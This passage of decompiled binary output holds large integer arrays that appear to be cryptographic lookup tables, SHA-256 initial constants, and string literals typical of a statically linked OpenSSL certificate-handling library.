  147374280,
  386339604,
  629514660,
  261063564,
  50529024,
  994800504,
  999011256,
  318968592,
  314757840,
  785310444,
  809529456,
  210534540,
  1057960764,
  680042664,
  839004720,
  500027868,
  919007988,
  876900468,
  751624428,
  361075092,
  185271048,
  390550356,
  474763356,
  457921368,
  1032696252,
  16843008,
  604250148,
  470552604,
  860058480,
  411603096,
  268439568,
  214745292,
  851636976,
  432656856,
  738992172,
  667411428,
  843215472,
  58950528,
  462132120,
  297914832,
  109478532,
  164217288,
  541089888,
  272650320,
  595829664,
  734782440,
  218956044,
  914797236,
  512660124,
  256852812,
  931640244,
  441078360,
  113689284,
  944271480,
  646357668,
  302125584,
  797942700,
  365285844,
  557932896,
  63161280,
  881111220,
  21053760,
  306336336,
  1028485500,
  227377548,
  134742024,
  521081628,
  428446104,
  0,
  420024600,
  67371012,
  323179344,
  935850996,
  566354400,
  1036907004,
  910586484,
  789521196,
  654779172,
  813740208,
  193692552,
  235799052,
  730571688,
  578986656,
  776888940,
  327390096,
  223166796,
  692674920,
  1011642492,
  151585032,
  168428040,
  1066382268,
  802153452,
  868479984,
  96846276,
  126321540,
  335810580,
  1053750012,
  608460900,
  516870876,
  772678188,
  189481800,
  436867608,
  101057028,
  553722144,
  726360936,
  642146916,
  33686016,
  902164980,
  310547088,
  176849544,
  202113036,
  864269232,
  1045328508,
  281071824,
  977957496,
  122110788,
  377918100,
  633725412,
  637936164,
  8421504,
  764256684,
  533713884,
  562143648,
  805318704,
  923218740,
  781099692,
  906375732,
  352653588,
  570565152,
  940060728,
  885321972,
  663200676,
  88424772,
  206323788,
  25264512,
  701096424,
  75792516,
  394761108,
  889532724,
  197903304,
  248431308,
  1007431740,
  826372464,
  285282576,
  130532292,
  160006536,
  893743476,
  1003222008,
  449499864,
  952692984,
  344232084,
  424235352,
  42107520,
  80003268,
  1070593020,
  155795784,
  956903736,
  658989924,
  12632256,
  265274316,
  398971860,
  948482232,
  252642060,
  244220556,
  37896768,
  587408160,
  293704080,
  743202924,
  466342872,
  612671652,
  872689716,
  834793968,
  138952776,
  46318272,
  793731948,
  1024274748,
  755835180,
  4210752,
  1049539260,
  1041117756,
  1015853244,
  29475264,
  713728680,
  982168248,
  240009804,
  356864340,
  990589752,
  483184860,
  675831912,
  1062171516,
  478974108,
  415813848,
  172638792,
  373707348,
  927429492,
  545300640,
  768467436,
  105267780,
  897954228,
  722150184,
  625303908,
  986379000,
  600040416,
  965325240,
  830583216,
  529503132,
  508449372,
  969535992,
  650568420,
  847426224,
  822161712,
  717939432,
  760045932,
  525292380,
  616882404,
  817950960,
  231588300,
  143163528,
  369496596,
  973746744,
  407392344,
  348442836,
  574775904,
  688464168,
  117900036,
  855847728,
  684253416,
  453710616,
  84214020,
  961114488,
  276861072,
  709517928,
  705307176,
  445289112,
  943196208,
  -399980320,
  741149985,
  -1540979038,
  -871379005,
  -601960750,
  -1338801229,
  -1204254544,
  -1406169181,
  1612726368,
  1410680145,
  -1006123069,
  1141130304,
  1815039843,
  1747667811,
  1478183763,
  -1073495101,
  1612857954,
  808649523,
  -1271560783,
  673777953,
  -1608482656,
  -534592798,
  -1540913245,
  -804011053,
  -1877900911,
  269549841,
  67503618,
  471600144,
  -1136882512,
  875955762,
  1208699715,
  -332410909,
  -2012706688,
  1814842464,
  -1473738592,
  337053459,
  -1006320448,
  336987666,
  -197868304,
  -1073560894,
  1141196097,
  -534658591,
  -736704814,
  1010765619,
  1010634033,
  -1945203070,
  -1743222640,
  673712160,
  1276005954,
  -197736718,
  1010699826,
  -1541044831,
  -130430479,
  202181889,
  -601894957,
  -669464368,
  673909539,
  1680229986,
  2017086066,
  606537507,
  741281571,
  -265174543,
  1882342002,
  1073889858,
  -736836400,
  1073824065,
  -1073692480,
  1882407795,
  1680295779,
  -1406366560,
  -2012509309,
  -197670925,
  -1406300767,
  -2147450752,
  471797523,
  -938816830,
  741084192,
  -1473607006,
  875824176,
  -804076846,
  134941443,
  -332476702,
  -399914527,
  1545424209,
  -1810594672,
  404228112,
  -130496272,
  1410811731,
  -1406234974,
  134744064,
  -1006254655,
  269681427,
  -871510591,
  -2079947134,
  -1204188751,
  -62926861,
  2084392305,
  -1073626687,
  808517937,
  -197802511,
  -2012575102,
  1747602018,
  -1338932815,
  -804142639,
  538968096,
  -736639021,
  131586,
  539099682,
  67372032,
  1747470432,
  1882276209,
  67569411,
  -669266989,
  -1675784815,
  -1743156847,
  1612792161,
  -1136750926,
  -467220766,
  1478052177,
  -602026543,
  1343308113,
  -1877966704,
  -602092336,
  -1743091054,
  -1608285277,
  -1473541213,
  -804208432,
  -2147384959,
  202313475,
  1141327683,
  404359698,
  -534527005,
  -332608288,
  -1945268863,
  -1136685133,
  -1810463086,
  2017151859,
  1545358416,
  -1608351070,
  -1608416863,
  1612923747,
  539165475,
  1275940161,
  -938948416,
  -1675719022,
  -1675850608,
  943327794,
  202116096,
  741215778,
  -1204122958,
  1814974050,
  -1675653229,
  1478117970,
  -265108750,
  -1877835118,
  -265042957,
  1208568129,
  2016954480,
  -871576384,
  336921873,
  -130298893,
  1882210416,
  1949648241,
  2084523891,
  875889969,
  269484048,
  197379,
  1680098400,
  1814908257,
  -1006188862,
  1949582448,
  -736770607,
  -1271626576,
  -399848734,
  134809857,
  1949714034,
  404293905,
  -62992654,
  1073758272,
  269615634,
  -534724384,
  -1136816719,
  67437825,
  -130364686,
  65793,
  -265240336,
  673843746,
  1545490002,
  -1473672799,
  1410745938,
  1073955651,
  -2080012927,
  336856080,
  -2012640895,
  -1743025261,
  -1338998608,
  -467286559,
  1208502336,
  2017020273,
  -1810397293,
  -63124240,
  471731730,
  -2147319166,
  539033889,
  -1945334656,
  404425491,
  1545555795,
  1949779827,
  1410614352,
  -1338867022,
  471665937,
  606405921,
  1276071747,
  0,
  1141261890,
  -332542495,
  1477986384,
  1343373906,
  -399782941,
  2084458098,
  -669332782,
  -938882623,
  -63058447,
  808452144,
  -1810528879,
  1680164193,
  1010568240,
  -1271494990,
  -467352352,
  -1204057165,
  2084326512,
  202247682,
  1343242320,
  943262001,
  606471714,
  808583730,
  -2080078720,
  1747536225,
  -1877769325,
  876021555,
  -467154973,
  606340128,
  -1541110624,
  -938751037,
  1343439699,
  134875650,
  -2079881341,
  -669398575,
  1275874368,
  -2147253373,
  -1945137277,
  -871444798,
  943393587,
  1208633922,
  -1271429197,
  -1582814839,
  -2122054267,
  -757852474,
  -741338173,
  1347687492,
  287055117,
  -1599329140,
  556016901,
  1364991309,
  1128268611,
  270014472,
  303832590,
  1364201793,
  -251904820,
  -1027077430,
  1667244867,
  539502600,
  1078199364,
  538976256,
  -1852039795,
  -522182464,
  -488627518,
  -1060632376,
  320083719,
  -1583078011,
  -2087972977,
  50332419,
  1937259339,
  -1279771765,
  319820547,
  -758115646,
  -487838002,
  1886400576,
  -2138305396,
  859586319,
  -1599592312,
  842019330,
  -774103603,
  -218876218,
  1886663748,
  -521392948,
  -1852566139,
  50858763,
  1398019911,
  1348213836,
  1398283083,
  -1313063539,
  16777473,
  539239428,
  270277644,
  1936732995,
  -1869080440,
  269488128,
  -1060369204,
  -219139390,
  -774366775,
  539765772,
  -471586873,
  1919955522,
  -2088762493,
  -1818748021,
  -774893119,
  -2105276794,
  -1043854903,
  1616912448,
  1347424320,
  -1549786237,
  -471323701,
  17566989,
  -1296812410,
  -1835262322,
  1129058127,
  -1280034937,
  1381505610,
  -1027340602,
  1886926920,
  -1566300538,
  303043074,
  -1548996721,
  -774629947,
  1633689921,
  -1010826301,
  -1330367356,
  1094713665,
  1380979266,
  1903967565,
  -2121527923,
  526344,
  320610063,
  -1852302967,
  0,
  286791945,
  263172,
  1397756739,
  -202098745,
  -505404991,
  -235127347,
  1920218694,
  590098191,
  589571847,
  -1330630528,
  -2088236149,
  34344462,
  -1549259893,
  -1566563710,
  1651256910,
  -1819274365,
  1095503181,
  1634216265,
  1887190092,
  17303817,
  34081290,
  -1279508593,
  -471060529,
  -202361917,
  -1044118075,
  -2088499321,
  269751300,
  -218349874,
  1617175620,
  -757326130,
  573320718,
  1128794955,
  303569418,
  33818118,
  555753729,
  1667771211,
  1650730566,
  33554946,
  -235653691,
  -1836051838,
  -2105013622,
  789516,
  -1280298109,
  1920745038,
  -791670592,
  1920481866,
  1128531783,
  -1835788666,
  -505141819,
  572794374,
  -2139094912,
  -1582551667,
  -740548657,
  -1583341183,
  808464384,
  859059975,
  -1565774194,
  842282502,
  286528773,
  572531202,
  808990728,
  -252431164,
  -1549523065,
  1094976837,
  1078725708,
  -2122317439,
  -504878647,
  -2138831740,
  -1819011193,
  825505029,
  -1010299957,
  -1026814258,
  809253900,
  1903178049,
  286265601,
  -1010563129,
  -2121791095,
  1903441221,
  -201835573,
  -757589302,
  -252167992,
  -1869343612,
  1364728137,
  -2105539966,
  -1060895548,
  -201572401,
  1095240009,
  825768201,
  1667508039,
  -1061158720,
  -1010036785,
  -741075001,
  -1330104184,
  51121935,
  -2104750450,
  1111491138,
  589308675,
  -1852829311,
  1617701964,
  -740811829,
  -1599855484,
  808727556,
  -235916863,
  1078462536,
  -1027603774,
  1668034383,
  826031373,
  556543245,
  1077936192,
  -1296286066,
  842808846,
  -1329841012,
  -1044381247,
  -1566037366,
  -1296549238,
  1112280654,
  1364464965,
  859323147,
  -790881076,
  1617438792,
  1937522511,
  -1868817268,
  -791144248,
  1112017482,
  1381242438,
  1936996167,
  -1600118656,
  -504615475,
  1111754310,
  -1313589883,
  589835019,
  1633953093,
  -218613046,
  -471850045,
  -1313326711,
  -1313853055,
  -1818484849,
  1381768782,
  -235390519,
  -488364346,
  -1297075582,
  825241857,
  -488101174,
  1634479437,
  1398546255,
  -521919292,
  -252694336,
  -1043591731,
  -2138568568,
  303306246,
  842545674,
  1347950664,
  -791407420,
  1650467394,
  556280073,
  50595591,
  858796803,
  -521656120,
  320346891,
  17040645,
  1903704393,
  -1869606784,
  1650993738,
  573057546,
  -1835525494,
  137377848,
  -924784600,
  220277805,
  -2036161498,
  -809251825,
  -825041890,
  -2085375949,
  -2001684424,
  -1885098961,
  1080057888,
  1162957845,
  -943471609,
  1145062404,
  1331915823,
  1264805931,
  1263753243,
  -1010581501,
  1113743394,
  53686323,
  -2051951563,
  153167913,
  -2136956896,
  -1025318878,
  -2019318745,
  -1009528813,
  -2121166831,
  17895441,
  100795398,
  202382364,
  -1934574532,
  103953462,
  1262700555,
  -807146449,
  -2004842488,
  1281387564,
  -2002737112,
  118690839,
  -993999868,
  101848086,
  -990841804,
  -1027424254,
  1161905157,
  -1042161631,
  -959261674,
  255015999,
  221330493,
  -1904047090,
  -2003789800,
  136325160,
  1312967694,
  -957156298,
  238173246,
  -2053004251,
  -906889159,
  218172429,
  -808199137,
  -925837288,
  186853419,
  1180853286,
  1249015866,
  119743527,
  253963311,
  -1041108943,
  1114796082,
  1111638018,
  -992947180,
  1094795265,
  -1061109760,
  1131638835,
  1197696039,
  -1935627220,
  -1954314229,
  -940313545,
  -1918784467,
  -2139062272,
  252910623,
  -893204470,
  203435052,
  -1969051606,
  70267956,
  -1026371566,
  184748043,
  -823989202,
  -907941847,
  1297177629,
  -2070899692,
  135272472,
  -923731912,
  1196643351,
  -1901941714,
  134219784,
  -977157115,
  51580947,
  -842937331,
  -2038266874,
  -1984841671,
  -806093761,
  1299283005,
  -1044267007,
  20000817,
  -973999051,
  -1971156982,
  1247963178,
  -2119061455,
  -1043214319,
  2105376,
  -942418921,
  33685506,
  35790882,
  67109892,
  1214277672,
  1097953329,
  117638151,
  -875309029,
  -1919837155,
  -1986947047,
  1096900641,
  -1900889026,
  -958208986,
  1230067737,
  -841884643,
  1095847953,
  -2138009584,
  -858727396,
  -1970104294,
  -2086428637,
  -1952208853,
  -1060057072,
  -2122219519,
  251857935,
  1195590663,
  168957978,
  -1008476125,
  -857674708,
  -1920889843,
  -1884046273,
  -2037214186,
  1265858619,
  1280334876,
  -2103271390,
  -2120114143,
  1130586147,
  52633635,
  1296124941,
  -926889976,
  -1902994402,
  -1936679908,
  171063354,
  201329676,
  237120558,
  -1967998918,
  1315073070,
  -1886151649,
  1246910490,
  -1024266190,
  -2104324078,
  -1007423437,
  1229015049,
  1215330360,
  -859780084,
  85005333,
  -873203653,
  1081110576,
  1165063221,
  1332968511,
  87110709,
  1052688,
  50528259,
  1147167780,
  1298230317,
  -960314362,
  1148220468,
  -976104427,
  -2068794316,
  -891099094,
  151062537,
  1181905974,
  152115225,
  -822936514,
  1077952512,
  34738194,
  -1059004384,
  -1917731779,
  83952645,
  -890046406,
  16842753,
  -1057951696,
  170010666,
  1314020382,
  -1985894359,
  1179800598,
  1128480771,
  -2055109627,
  68162580,
  -1987999735,
  -1953261541,
  -2135904208,
  -975051739,
  1212172296,
  1232173113,
  -2020371433,
  -856622020,
  236067870,
  -2105376766,
  18948129,
  -1937732596,
  185800731,
  1330863135,
  1198748727,
  1146115092,
  -2102218702,
  219225117,
  86058021,
  1329810447,
  0,
  1178747910,
  -840831955,
  1213224984,
  1112690706,
  -874256341,
  1316125758,
  -892151782,
  -910047223,
  -839779267,
  3158064,
  -2054056939,
  1164010533,
  204487740,
  -2035108810,
  -991894492,
  -1951156165,
  1282440252,
  235015182,
  1079005200,
  154220601,
  102900774,
  36843570,
  -2071952380,
  1231120425,
  -2087481325,
  120796215,
  -941366233,
  69215268,
  -2069847004,
  -876361717,
  1129533459,
  167905290,
  -2021424121,
  -908994535,
  1279282188,
  -2088534013,
  -1887204337,
  -826094578,
  187906107,
  1245857802,
  -2018266057
}; // weak
__int128 SHA256_Constants_140119400 = 0xA54FF53A3C6EF372BB67AE856A09E667i64; // weak
__int128 SHA256_Constants_140119410 = 0x5BE0CD191F83D9AB9B05688C510E527Fi64; // weak
char aMin[4] = "min"; // weak
char aMax[4] = "max"; // weak
char aMask[5] = "mask"; // weak
char aFlags[6] = "flags"; // weak
char aNomask[7] = "nomask"; // weak
char aEmpty[6] = "EMPTY"; // weak
char aInit[5] = "init"; // weak
_UNKNOWN unk_140119870; // weak
char aEnv[4] = "ENV"; // weak
_UNKNOWN unk_140119BB0; // weak
char a0123456789abcd_4[17] = "0123456789ABCDEF"; // weak
char aPkcs7[6] = "PKCS7"; // weak
char aCms[4] = "CMS"; // weak
_UNKNOWN unk_140119E88; // weak
_UNKNOWN unk_140119EB8; // weak
_UNKNOWN unk_140119F40; // weak
_UNKNOWN unk_14011A000; // weak
_UNKNOWN unk_14011A110; // weak
_UNKNOWN unk_14011A160; // weak
_UNKNOWN unk_14011A1B0; // weak
_UNKNOWN unk_14011A218; // weak
_UNKNOWN unk_14011A380; // weak
char aKeyid[6] = "keyid"; // weak
_UNKNOWN unk_14011A440; // weak
_UNKNOWN unk_14011A4D0; // weak
_UNKNOWN unk_14011A540; // weak
_UNKNOWN unk_14011A690; // weak
_UNKNOWN unk_14011A6E0; // weak
_UNKNOWN unk_14011A830; // weak
char *off_14011A838[2] = { "Unused", "unused" }; // weak
_UNKNOWN unk_14011A990; // weak
_UNKNOWN unk_14011AA20; // weak
_UNKNOWN unk_14011AA70; // weak
_UNKNOWN unk_14011AB60; // weak
char aReasons_0[8] = "reasons"; // weak
char aOnlyca[7] = "onlyCA"; // weak
char aOnlyaa[7] = "onlyAA"; // weak
_UNKNOWN unk_14011B160; // weak
_UNKNOWN unk_14011B1D0; // weak
_UNKNOWN unk_14011B3D0; // weak
_UNKNOWN unk_14011B440; // weak
_UNKNOWN unk_14011B4B0; // weak
_UNKNOWN unk_14011B520; // weak
char aInherit[8] = "inherit"; // weak
_UNKNOWN unk_14011B930; // weak
_UNKNOWN unk_14011B9A0; // weak
_UNKNOWN unk_14011BA10; // weak
_UNKNOWN unk_14011BA80; // weak
_UNKNOWN unk_14011BAD0; // weak
char a0123456789abcd_5[17] = "0123456789ABCDEF"; // weak
void *off_14011BF10 = &unk_14011C008; // weak
_UNKNOWN unk_14011C3A0; // weak
_UNKNOWN unk_14011C4E0; // weak
_UNKNOWN unk_14011C550; // weak
char aPolicy[7] = "policy"; // weak
_UNKNOWN unk_14011C6A0; // weak
char aPathlen[8] = "pathlen"; // weak
char byte_14011C6F4 = 'C'; // weak
_UNKNOWN unk_14011C770; // weak
_UNKNOWN unk_14011C820; // weak
_UNKNOWN unk_14011C8E0; // weak
_UNKNOWN unk_14011C980; // weak
_UNKNOWN unk_14011C982; // weak
_UNKNOWN unk_14011D980; // weak
void *off_14011E140 = &unk_14011E230; // weak
void *off_14011E158 = &unk_14011E2B0; // weak
void *off_14011E170 = &unk_14011E218; // weak
void *off_14011E188 = &unk_14011E330; // weak
void *off_14011E1A0 = &unk_14011E430; // weak
void *off_14011E1B8 = &unk_14011E530; // weak
void *off_14011E1D0 = &unk_14011E550; // weak
void *off_14011E1E8 = &unk_14011E650; // weak
void *off_14011E200 = &unk_14011E750; // weak
_UNKNOWN unk_14011EAA0; // weak
_UNKNOWN unk_14011EBA0; // weak
_UNKNOWN unk_14011EC30; // weak
_UNKNOWN unk_14011ED40; // weak
_UNKNOWN unk_14011EDB0; // weak
_UNKNOWN unk_14011EE60; // weak
_UNKNOWN unk_14011EEB0; // weak
_UNKNOWN unk_14011F040; // weak
_UNKNOWN unk_14011F0B0; // weak
_UNKNOWN unk_14011F1A0; // weak
_UNKNOWN unk_14011F2E0; // weak
_UNKNOWN unk_14011F350; // weak
_UNKNOWN unk_14011F610; // weak
_UNKNOWN unk_14011F770; // weak
_UNKNOWN unk_14011F800; // weak
_DWORD dword_14011F910[1036] =
{
  1886416896,
  -2105376256,
  741092352,
  -320017408,
  -1280068864,
  656877312,
  -1061109760,
  -437918464,
  -454761472,
  -2054847232,
  1465341696,
  892679424,
  -353703424,
  202116096,
  -1364283904,
  1094795520,
  589505280,
  -269488384,
  1802201856,
  -1819045120,
  1162167552,
  421075200,
  -1515870976,
  555819264,
  -303174400,
  235802112,
  1330597632,
  1313754624,
  488447232,
  1701143808,
  -1835888128,
  -1111638784,
  -2038004224,
  -1195853824,
  -1347440896,
  -1886417152,
  2088532992,
  -336860416,
  522133248,
  -825307648,
  1044266496,
  808464384,
  -589505536,
  1600085760,
  1583242752,
  -976894720,
  185273088,
  437918208,
  -1499027968,
  -505290496,
  960051456,
  -892679680,
  -707406592,
  1195853568,
  1566399744,
  1027423488,
  -640034560,
  16843008,
  1515870720,
  -690563584,
  1364283648,
  1448498688,
  1819044864,
  1296911616,
  -1953789184,
  218959104,
  -1701144064,
  1717986816,
  -67372288,
  -858993664,
  -1330597888,
  757935360,
  1953788928,
  303174144,
  724249344,
  538976256,
  -252645376,
  -1313754880,
  -2071690240,
  -1717987072,
  -538976512,
  1280068608,
  -875836672,
  -1027423744,
  875836416,
  2122219008,
  1987474944,
  84215040,
  1835887872,
  -1212696832,
  -1448498944,
  825307392,
  -774778624,
  387389184,
  67372032,
  -673720576,
  336860160,
  1482184704,
  976894464,
  1633771776,
  -555819520,
  454761216,
  286331136,
  471604224,
  842150400,
  252645120,
  -1667458048,
  370546176,
  1397969664,
  404232192,
  -218959360,
  572662272,
  -16843264,
  1145324544,
  -808464640,
  -1296911872,
  -1010580736,
  -1246382848,
  2054846976,
  -1852731136,
  606348288,
  134744064,
  -387389440,
  -1465341952,
  1616928768,
  -50529280,
  1768515840,
  1347440640,
  -1431655936,
  -791621632,
  -1600086016,
  2105376000,
  -1583243008,
  -1987475200,
  1650614784,
  -1751673088,
  1414812672,
  1532713728,
  505290240,
  -1785359104,
  -522133504,
  -256,
  1684300800,
  -757935616,
  269488128,
  -993737728,
  0,
  1212696576,
  -1549556992,
  -134744320,
  1970631936,
  -606348544,
  -1970632192,
  50529024,
  -421075456,
  -623191552,
  151587072,
  1061109504,
  -572662528,
  -1802202112,
  -2021161216,
  1549556736,
  -2088533248,
  33686016,
  -842150656,
  1246382592,
  -1869574144,
  858993408,
  1936945920,
  1734829824,
  -151587328,
  -202116352,
  -1650615040,
  2139062016,
  -1077952768,
  -488447488,
  1381126656,
  -1684301056,
  -656877568,
  640034304,
  -926365696,
  926365440,
  -960051712,
  993737472,
  -2122219264,
  -1768516096,
  1869573888,
  1263225600,
  320017152,
  -1094795776,
  1667457792,
  774778368,
  -370546432,
  2038003968,
  -1482184960,
  -1936946176,
  -1616929024,
  1852730880,
  -1128481792,
  -1903260160,
  690563328,
  -168430336,
  -101058304,
  -1229539840,
  791621376,
  -33686272,
  -1263225856,
  1499027712,
  2021160960,
  -1734830080,
  101058048,
  1785358848,
  -404232448,
  1179010560,
  1903259904,
  -1162167808,
  -724249600,
  623191296,
  -1414812928,
  1111638528,
  -2004318208,
  -1566400000,
  -1920103168,
  -84215296,
  1920102912,
  117901056,
  -1179010816,
  1431655680,
  -117901312,
  -286331392,
  -1397969920,
  168430080,
  909522432,
  1229539584,
  707406336,
  1751672832,
  1010580480,
  943208448,
  -235802368,
  -1532713984,
  1077952512,
  673720320,
  -741092608,
  2071689984,
  -1145324800,
  -909522688,
  1128481536,
  -1044266752,
  353703168,
  -471604480,
  -1381126912,
  -185273344,
  2004317952,
  -943208704,
  -2139062272,
  -1633772032,
  1886388336,
  741081132,
  -1280114509,
  -1061158720,
  -454819612,
  1465319511,
  -353763094,
  -1364328274,
  589496355,
  1802174571,
  1162149957,
  -1515913051,
  -303234835,
  1330577487,
  488439837,
  -1835925358,
  -2038038394,
  -1347485521,
  2088501372,
  522125343,
  1044250686,
  -589561636,
  1583218782,
  185270283,
  -1499070298,
  960036921,
  -707460907,
  1566376029,
  -640089895,
  1515847770,
  1364262993,
  1819017324,
  -1953824629,
  -1701183334,
  -67436293,
  -1330642768,
  1953759348,
  724238379,
  -252706576,
  -2071723900,
  -539033377,
  -875888437,
  875823156,
  1987444854,
  1835860077,
  -1448542039,
  -774831919,
  67371012,
  336855060,
  976879674,
  -555876130,
  286326801,
  842137650,
  -1667497828,
  1397948499,
  -219021070,
  -16908034,
  -808517425,
  -1010630461,
  2054815866,
  606339108,
  -387448600,
  1616904288,
  1768489065,
  -1431699286,
  -1600126816,
  -1583284063,
  1650589794,
  1414791252,
  505282590,
  -522190624,
  1684275300,
  269484048,
  0,
  -1549598557,
  1970602101,
  -1970667382,
  -421134106,
  151584777,
  -572718883,
  -2021195641,
  -2088566653,
  -842202931,
  -1869610864,
  1936916595,
  -151650058,
  -1650655075,
  -1078001473,
  1381105746,
  -656932648,
  -926416696,
  -960102202,
  -2122252159,
  1869545583,
  320012307,
  1667432547,
  -370605847,
  -1482227545,
  -1616969569,
  -1128529732,
  690552873,
  -101121799,
  791609391,
  -1263271756,
  2021130360,
  101056518,
  -404291353,
  1903231089,
  -724303660,
  -1414856533,
  -2004352888,
  -1920139123,
  1920073842,
  -1179057991,
  -117964552,
  -1398013780,
  909508662,
  707395626,
  1010565180,
  -235863823,
  1077936192,
  -741146413,
  -1145372485,
  1128464451,
  353697813,
  -1381171027,
  2004287607,
  -2139094912,
  -2105409406,
  -320077588,
  656867367,
  -437976859,
  -2054881147,
  892665909,
  202113036,
  1094778945,
  -269549329,
  -1819082605,
  421068825,
  555810849,
  235798542,
  1313734734,
  1701118053,
  -1111686979,
  -1195900744,
  -1886453617,
  -336920341,
  -825360178,
  808452144,
  1600061535,
  -976944955,
  437911578,
  -505347871,
  -892731190,
  1195835463,
  1027407933,
  16842753,
  -690618154,
  1448476758,
  1296891981,
  218955789,
  1717960806,
  -859045684,
  757923885,
  303169554,
  538968096,
  -1313800015,
  -1718026087,
  1280049228,
  -1027473214,
  2122186878,
  84213765,
  -1212743497,
  825294897,
  387383319,
  -673775401,
  1482162264,
  1633747041,
  454754331,
  471597084,
  252641295,
  370540566,
  404226072,
  572653602,
  1145307204,
  -1296957262,
  -1246429003,
  -1852768111,
  134742024,
  -1465384792,
  -50593540,
  1347420240,
  -791674672,
  2105344125,
  -1987510135,
  -1751711593,
  1532690523,
  -1785397099,
  -65281,
  -757989166,
  -993787708,
  1212678216,
  -134807305,
  -606404389,
  50528259,
  -623247142,
  1061093439,
  -1802239852,
  1549533276,
  33685506,
  1246363722,
  858980403,
  1734803559,
  -202178317,
  2139029631,
  -488505118,
  -1684340581,
  640024614,
  926351415,
  993722427,
  -1768554346,
  1263206475,
  -1094844226,
  774766638,
  2037973113,
  -1936981876,
  1852702830,
  -1903296370,
  -168492811,
  -1229586250,
  -33750787,
  1499005017,
  -1734868840,
  1785331818,
  1178992710,
  -1162215238,
  623181861,
  1111621698,
  -1566441310,
  -84279046,
  117899271,
  1431634005,
  -286392082,
  168427530,
  1229520969,
  1751646312,
  943194168,
  -1532755804,
  673710120,
  2071658619,
  -909573943,
  -1044315967,
  -471662365,
  -185335564,
  -943259449,
  -1633812322,
  14737632,
  328965,
  5789784,
  14277081,
  6776679,
  5131854,
  8487297,
  13355979,
  13224393,
  723723,
  11447982,
  6974058,
  14013909,
  1579032,
  6118749,
  8553090,
  4605510,
  14671839,
  14079702,
  2565927,
  9079434,
  3289650,
  4934475,
  4342338,
  14408667,
  1842204,
  10395294,
  10263708,
  3815994,
  13290186,
  2434341,
  8092539,
  855309,
  7434609,
  6250335,
  2039583,
  16316664,
  14145495,
  4079166,
  10329501,
  8158332,
  6316128,
  12171705,
  12500670,
  12369084,
  9145227,
  1447446,
  3421236,
  5066061,
  12829635,
  7500402,
  9803157,
  11250603,
  9342606,
  12237498,
  8026746,
  11776947,
  131586,
  11842740,
  11382189,
  10658466,
  11316396,
  14211288,
  10132122,
  1513239,
  1710618,
  3487029,
  13421772,
  16250871,
  10066329,
  6381921,
  5921370,
  15263976,
  2368548,
  5658198,
  4210752,
  14803425,
  6513507,
  592137,
  3355443,
  12566463,
  10000536,
  9934743,
  8750469,
  6842472,
  16579836,
  15527148,
  657930,
  14342874,
  7303023,
  5460819,
  6447714,
  10724259,
  3026478,
  526344,
  11513775,
  2631720,
  11579568,
  7631988,
  12763842,
  12434877,
  3552822,
  2236962,
  3684408,
  6579300,
  1973790,
  3750201,
  2894892,
  10921638,
  3158064,
  15066597,
  4473924,
  16645629,
  8947848,
  10461087,
  6645093,
  8882055,
  7039851,
  16053492,
  2302755,
  4737096,
  1052688,
  13750737,
  5329233,
  12632256,
  16382457,
  13816530,
  10526880,
  5592405,
  10592673,
  4276545,
  16448250,
  4408131,
  1250067,
  12895428,
  3092271,
  11053224,
  11974326,
  3947580,
  2829099,
  12698049,
  16777215,
  13158600,
  10855845,
  2105376,
  9013641,
  0,
  9474192,
  4671303,
  15724527,
  15395562,
  12040119,
  1381653,
  394758,
  13487565,
  11908533,
  1184274,
  8289918,
  12303291,
  2697513,
  986895,
  12105912,
  460551,
  263172,
  10197915,
  9737364,
  2171169,
  6710886,
  15132390,
  13553358,
  15592941,
  15198183,
  3881787,
  16711422,
  8355711,
  12961221,
  10790052,
  3618615,
  11645361,
  5000268,
  9539985,
  7237230,
  9276813,
  7763574,
  197379,
  2960685,
  14606046,
  9868950,
  2500134,
  8224125,
  13027014,
  6052956,
  13882323,
  15921906,
  5197647,
  1644825,
  4144959,
  14474460,
  7960953,
  1907997,
  5395026,
  15461355,
  15987699,
  7171437,
  6184542,
  16514043,
  6908265,
  11711154,
  15790320,
  3223857,
  789516,
  13948116,
  13619151,
  9211020,
  14869218,
  7697781,
  11119017,
  4868682,
  5723991,
  8684676,
  1118481,
  4539717,
  1776411,
  16119285,
  15000804,
  921102,
  7566195,
  11184810,
  15856113,
  14540253,
  5855577,
  1315860,
  7105644,
  9605778,
  5526612,
  13684944,
  7895160,
  7368816,
  14935011,
  4802889,
  8421504,
  5263440,
  10987431,
  16185078,
  7829367,
  9671571,
  8816262,
  8618883,
  2763306,
  13092807,
  5987163,
  15329769,
  15658734,
  9408399,
  65793,
  4013373,
  939538488,
  1090535745,
  369104406,
  1979741814,
  -654255655,
  -1828678765,
  1610637408,
  -234818830,
  1912631922,
  -1040137534,
  -1426019413,
  -1711236454,
  1962964341,
  100664838,
  1459640151,
  -1610571616,
  -1862233711,
  -150931465,
  -1258244683,
  -922695223,
  -1577016670,
  -1946121076,
  -771697966,
  -1879011184,
  -167708938,
  117442311,
  -1493129305,
  654321447,
  -1912566130,
  -1308577102,
  1224755529,
  -570368290,
  1124090691,
  1543527516,
  -687810601,
  -956250169,
  1040203326,
  -184486411,
  -1895788657,
  1728079719,
  520101663,
  402659352,
  1845522030,
  -1358909521,
  788541231,
  -503258398,
  -2063563387,
  218107149,
  1392530259,
  -268373776,
  -1677681508,
  1694524773,
  -369038614,
  -1560239197,
  -1375686994,
  -1644126562,
  -335483668,
  -2147450752,
  754986285,
  1795189611,
  -1476351832,
  721431339,
  905983542,
  -1509906778,
  -989805115,
  -2046785914,
  1291865421,
  855651123,
  -50266627,
  1711302246,
  1476417624,
  -1778346346,
  973093434,
  150997257,
  -1795123819,
  268439568,
  2013296760,
  -671033128,
  1107313218,
  -872362804,
  -285151249,
  637543974,
  -452925979,
  1627414881,
  436214298,
  1056980799,
  989870907,
  -2113895806,
  -1241467210,
  -620700709,
  -738143020,
  -1744791400,
  -402593560,
  -1962898549,
  33554946,
  -352261141,
  167774730,
  738208812,
  486546717,
  -1342132048,
  1862299503,
  -1929343603,
  -2013230968,
  234884622,
  419436825,
  -2030008441,
  1308642894,
  184552203,
  -1459574359,
  201329676,
  2030074233,
  285217041,
  2130739071,
  570434082,
  -419371033,
  1493195097,
  -520035871,
  -637478182,
  1023425853,
  -939472696,
  301994514,
  67109892,
  1946186868,
  1409307732,
  805318704,
  2113961598,
  -1275022156,
  671098920,
  1426085205,
  1744857192,
  1342197840,
  -1107247426,
  -805252912,
  -1006582588,
  822096177,
  -889140277,
  704653866,
  -1392464467,
  251662095,
  -905917750,
  1879076976,
  -16711681,
  838873650,
  1761634665,
  134219784,
  1644192354,
  0,
  603989028,
  -788475439,
  -83821573,
  -1174357318,
  -318706195,
